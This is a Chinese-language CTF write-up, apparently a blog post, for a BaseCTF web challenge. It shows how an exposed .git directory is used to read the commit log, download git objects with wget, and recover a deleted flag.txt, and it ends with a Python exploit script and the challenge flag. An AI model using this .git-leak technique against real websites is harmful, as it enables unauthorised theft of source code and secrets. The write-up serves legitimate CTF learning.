---
title: "back_to_the_future"
date: "2026-04-09T00:00:00+08:00"
lastmod: "2026-04-09T00:00:00+08:00"
slug: "back_to_the_future"
summary: "[比较复杂的/.git泄露]"
tags:
  - "Web"
  - "Git Leak"
  - "BASECTF"
params:
  protected: false
  commentId: "back_to_the_future"
  legacyId: "back_to_the_future"
---


[比较复杂的/.git泄露]

find songthing盲猜robots协议

发现.git/

存在git文件泄露，于是githack提取源码：

```
D:\githack\GitHack-master>python githack.py http://challenge.imxbt.cn:32101/.git/
[+] Download and parse index file ...
[+] README.md
[OK] README.md
```

readme写道：

```
# My Website

This is my web project.

Oops, I place flag here, but i deleted it!
```

要追溯历史文件

想到了bugku做到的source，参考下解法,利用wget指令得到git文件

下载/.git/被ban，/.git/config成功

```
[core]
	repositoryformatversion = 0
	filemode = false
	bare = false
	logallrefupdates = true
	symlinks = false
	ignorecase = true
```

于是读取 /.git/logs/HEAD查看提交日志

```
 0000000000000000000000000000000000000000 8f7720b7891039b394e26e67ff10d6c6d2a144d5 Kengwang <github@kengwang.com.cn> 1724351558 +0800	commit (initial): Initial Commit
8f7720b7891039b394e26e67ff10d6c6d2a144d5 9d85f10e0192ef630e10d7f876a117db41c30417 Kengwang <github@kengwang.com.cn> 1724351673 +0800	commit: Add What
9d85f10e0192ef630e10d7f876a117db41c30417 e2bc04bc70f7b7476ae7ad0e943ef62aa2b5556e Kengwang <github@kengwang.com.cn> 1724351728 +0800	commit: Remove Flag
```

于是抓取9d85f10e0192ef630e10d7f876a117db41c30417的内容：/.git/objects/9d/85f10e0192ef630e10d7f876a117db41c30417

删除已有的.git文件

```
rm -rf .git
```

移入下载得到的文件

```
mv 85f10e0192ef630e10d7f876a117db41c30417 .git/objects/9d/
```

使用git打印改commit的内容

```
git cat-file -p 9d85f10e0192ef630e10d7f876a117db41c30417
tree b5a27f2196dceb21778f2d6c7d8536bdca8534d2
parent 8f7720b7891039b394e26e67ff10d6c6d2a144d5
author Kengwang <github@kengwang.com.cn> 1724351673 +0800
committer Kengwang <github@kengwang.com.cn> 1724351673 +0800
gpgsig -----BEGIN PGP SIGNATURE-----
 
 iQIzBAABCAAdFiEEdNAOWRbUaClRFMzdntTLigz0KxgFAmbHhMkACgkQntTLigz0
 KxjgGg/9FVaa8rX4eVHSPneKWutmjPHXzBw09TjLi68Ty0SnNl5H8EOObAhLyCL6
 EqtnzhmnMn+nB5d0EzJOK9fSXuBjU/g9Qclsm35s6xvG49NA8q1V5OnmDI+/wInO
 eEf/RF1wHFRQ4JXnao9pPxLFauD3z8Scfgle/7InRMm24/uVy4bHjdirpOGAxsOC
 VUB4bwKL94QpOgMZsEnzYJuFhYqewUQOM2Yz6jr2Wio758dFGQPRNqgZzVvUlM7m
 /FUiUEEgUqNb1S5I2/ouf8HjvUN+/3Wr2tvvieDX+C2/3zczaaDXjgGhhTodooXO
 QM6290UCL8eq9M+T95zJAB2oLA5AJBxp5rUYhAE1g08wrT8CW854/wZDi5ZpxjwT
 haRfWPLNWTZWNIco4/R56OuTjP2AWu9FBpchgk+oFxj9lFSVeeKADbNzSp4t2Wik
 Ipgm6YOtVTW6R/9f6wzyD0+0TMD9L/4xFk6dxoG+lf8Ibb5jU7eoDaxCz67NVjK5
 NjYjp0X8iyTS0h3u/DlmtSOSugrLzbBiF7eP2MXltbLlr6EF71WmW37X3w4zYhDY
 sTHMdCu2OUKdSOT08maPcS2+wWFhEfhAXba8lzhOE8XykzoCFuvZCvq1FMsVBMMs
 uDDke0u3nodhSM5+Kukch8LbNm4ruc35NDocS9wd1iQyVb/3yrk=
 =5gJ8
 -----END PGP SIGNATURE-----

Add What

```

得到tree值：/.git/objects/b5/a27f2196dceb21778f2d6c7d8536bdca8534d2

重复以上操作，移动文件，然后查看文件内容：

```
mkdir -p .git/objects/b5/
mv a27f2196dceb21778f2d6c7d8536bdca8534d2 .git/objects/b5/

git cat-file -p b5a27f2196dceb21778f2d6c7d8536bdca8534d2
100644 blob 0d2c09b9b0c9e912fe9404a3c36bd7ec2dbb080e    README.md
100644 blob db8b21d3ebddd6826ee6f2583a6e4f56b3e9a736    flag.txt
```

存在flag.txt

下载：

```
wget http://challenge.imxbt.cn:32101/.git/objects/db/8b21d3ebddd6826ee6f2583a6e4f56b3e9a736
```

最后重复

```
# 创建目录
mkdir -p .git/objects/db/

# 移动文件
mv 8b21d3ebddd6826ee6f2583a6e4f56b3e9a736 .git/objects/db/

# 见证奇迹的时刻
git cat-file -p db8b21d3ebddd6826ee6f2583a6e4f56b3e9a736
BaseCTF{1aa62024-5a12-4f55-80fa-cb9c41e1154b}  
```

## Flag

```
BaseCTF{1aa62024-5a12-4f55-80fa-cb9c41e1154b}
```

## Exp

```python
import os
import requests
from urllib.parse import urljoin

BASE = "http://challenge.imxbt.cn:32101"

def fetch_obj(hash_obj):
    prefix = hash_obj[:2]
    rest = hash_obj[2:]
    url = f"{BASE}/.git/objects/{prefix}/{rest}"
    r = requests.get(url)
    if r.status_code == 200:
        os.makedirs(f".git/objects/{prefix}", exist_ok=True)
        with open(f".git/objects/{prefix}/{rest}", "wb") as f:
            f.write(r.content)
        return True
    return False

# Read commit log
r = requests.get(f"{BASE}/.git/logs/HEAD")
print("[+] Commit log:")
print(r.text)

# Download target commit object
fetch_obj("9d85f10e0192ef630e10d7f876a117db41c30417")
os.system("git cat-file -p 9d85f10e0192ef630e10d7f876a117db41c30417")

# Download tree object
fetch_obj("b5a27f2196dceb21778f2d6c7d8536bdca8534d2")
os.system("git cat-file -p b5a27f2196dceb21778f2d6c7d8536bdca8534d2")

# Download flag blob
fetch_obj("db8b21d3ebddd6826ee6f2583a6e4f56b3e9a736")
os.system("git cat-file -p db8b21d3ebddd6826ee6f2583a6e4f56b3e9a736")
```

